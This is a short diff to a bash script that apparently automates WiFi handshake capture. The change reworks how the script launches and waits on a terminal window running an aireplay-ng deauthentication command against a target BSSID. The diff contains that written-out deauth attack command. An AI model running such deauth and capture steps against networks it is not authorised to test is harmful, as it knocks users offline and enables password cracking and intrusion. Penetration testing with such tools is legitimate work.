@@ -123,7 +123,7 @@ bail() {
 
 cleanup() {
   if [[ "$MONITOR_ENABLED" == "1" ]]; then
-    echo -e "\n\n  ${CYAN}[*] Restoring network connectivity...${NC}"
+    echo -e "\n  ${CYAN}[*] Restoring network connectivity...${NC}"
     sudo systemctl restart NetworkManager
     echo -e "  ${GREEN}[✓] NetworkManager restarted.${NC}\n"
   fi
@@ -472,11 +472,10 @@ stage_capture() {
     echo -e "\n  ${YELLOW}[*] Skipping deauth.${NC}"
   else
     confirm "Send deauth to $TARGET_BSSID now?" || bail "Aborted."
-    launch_in_terminal "sudo aireplay-ng -0 '$PACKET_COUNT' -a '$TARGET_BSSID' '$INTERFACE'" >/dev/null
-    echo -e "\n  ${YELLOW}[*] Deauth window launched.${NC}"
-    echo -ne "  ${YELLOW}    Press Enter when ready to continue...${NC}"
-    read -r
-    while IFS= read -r -t 0 _; do :; done 2>/dev/null
+
+    local flag
+    flag=$(launch_in_terminal "sudo aireplay-ng -0 '$PACKET_COUNT' -a '$TARGET_BSSID' '$INTERFACE'")
+    wait_for_terminal "$flag" "Sending deauth packets, waiting for window to close..."
   fi
 
   # Confirm handshake
